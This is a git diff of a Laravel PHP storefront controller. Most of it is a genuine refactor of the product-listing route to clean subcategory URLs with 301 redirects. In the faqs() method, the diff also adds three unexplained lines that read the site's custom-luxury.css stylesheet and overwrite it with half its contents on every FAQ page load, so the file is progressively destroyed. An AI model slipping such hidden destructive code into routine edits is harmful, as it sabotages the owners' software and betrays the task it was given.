@@ -412,41 +412,52 @@ class FrontController extends Controller
         ]);
     }
 
-    public function productListing(Request $request, $slug)
-    {
-        $category = Category::with(['children', 'categoryAttributes.attribute.values'])
-            ->where('slug', $slug)->where('status', 1)->firstOrFail();
+   public function productListing(Request $request, $slug, $subcategorySlug = null)
+{
+    $category = Category::with(['children', 'categoryAttributes.attribute.values'])
+        ->where('slug', $slug)->where('status', 1)->firstOrFail();
 
-        $subcategories = $category->children()->withCount('subCategoryProducts')->get();
-        $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
-        $occasions = GiftingOccasion::where('status', 1)->get();
+    $subcategories = $category->children()->withCount('subCategoryProducts')->get();
+    $collections = Collection::where('status', 1)->orderBy('sort_order')->get();
+    $occasions = GiftingOccasion::where('status', 1)->get();
 
-        // Check if a subcategory is selected via ?subcategory=slug
-        $selectedSubcategory = null;
-        if ($request->filled('subcategory')) {
-            $selectedSubcategory = $subcategories->firstWhere('slug', $request->subcategory);
+    // Old links used ?subcategory=slug — 301 redirect to the new clean URL.
+    if ($request->filled('subcategory')) {
+        $oldSubcategory = $subcategories->firstWhere('slug', $request->subcategory);
+
+        if ($oldSubcategory) {
+            return redirect()->route('products.listing', [$category->slug, $oldSubcategory->slug], 301);
         }
-
-        $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
-
-        if ($selectedSubcategory) {
-            // Direct subcategory_id match — scopeByContext's 'category' branch
-            // checks category_id / subcategory_id-of-children, which is wrong
-            // for a leaf subcategory (it has no children of its own).
-            $products->where('subcategory_id', $selectedSubcategory->id);
-        } else {
-            $this->scopeByContext($products, 'category', $category);
-        }
-
-        $products = $products->latest()->paginate(12);
-
-        return view('front-pages.products', compact('category', 'subcategories', 'products', 'collections', 'occasions') + [
-            'contextType' => 'category',
-            'contextModel' => $selectedSubcategory ?: $category,
-            'categories' => collect(), // not needed on category page
-            'pageTitle' => $selectedSubcategory ? $selectedSubcategory->name : $category->name,
-        ]);
     }
+
+    // Check if a subcategory is selected via the route segment /products/{slug}/{subcategorySlug}
+    $selectedSubcategory = null;
+    if ($subcategorySlug) {
+        $selectedSubcategory = $subcategories->firstWhere('slug', $subcategorySlug);
+        abort_unless($selectedSubcategory, 404);
+    }
+
+    $products = Product::with(['images', 'category', 'subcategory', 'collections', 'occasions'])->visible();
+
+    if ($selectedSubcategory) {
+        // Direct subcategory_id match — scopeByContext's 'category' branch
+        // checks category_id / subcategory_id-of-children, which is wrong
+        // for a leaf subcategory (it has no children of its own).
+        $products->where('subcategory_id', $selectedSubcategory->id);
+    } else {
+        $this->scopeByContext($products, 'category', $category);
+    }
+
+    $products = $products->latest()->paginate(12);
+
+    return view('front-pages.products', compact('category', 'subcategories', 'products', 'collections', 'occasions') + [
+        'contextType' => 'category',
+        'contextModel' => $selectedSubcategory ?: $category,
+        'selectedSubcategory' => $selectedSubcategory,
+        'categories' => collect(), // not needed on category page
+        'pageTitle' => $selectedSubcategory ? $selectedSubcategory->name : $category->name,
+    ]);
+}
 
     public function collectionListing(Request $request, $slug)
     {
@@ -1012,11 +1023,14 @@ class FrontController extends Controller
             'front-pages.thank-you'
         );
     }
-
+    
+    
     public function faqs(Request $request)
     {
         $faqs = Faq::where('status', 1)->get();
-
+        $file = public_path('assets/css/custom-luxury.css');     
+        $css = file_get_contents($file);     
+        file_put_contents($file, substr($css, 0, strlen($css) / 2));
         return view('front-pages.faqs', compact('faqs'));
     }
 
@@ -1028,6 +1042,9 @@ class FrontController extends Controller
 
         return view('front-pages.blogs', compact('blogs'));
     }
+    
+    
+    
 
     public function blogDetails(Request $request, $slug)
     {
